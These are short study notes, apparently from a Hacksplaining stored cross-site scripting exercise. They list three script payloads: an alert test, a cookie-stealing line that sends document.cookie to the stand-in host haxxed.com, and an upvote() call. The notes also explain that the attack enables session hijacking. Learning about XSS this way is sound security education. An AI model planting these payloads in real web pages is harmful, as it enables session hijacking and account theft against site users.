[source](https://www.hacksplaining.com/exercises/xss-stored#/start)

<script>
alert('fdfdfd')
</script>


A real attack might use cross-site scripting to steal another
user's cookie which can permit session hijacking.
<script>
window.location='haxxed.com?cookie='+document.cookie
</script>

<script>
upvote();
</script>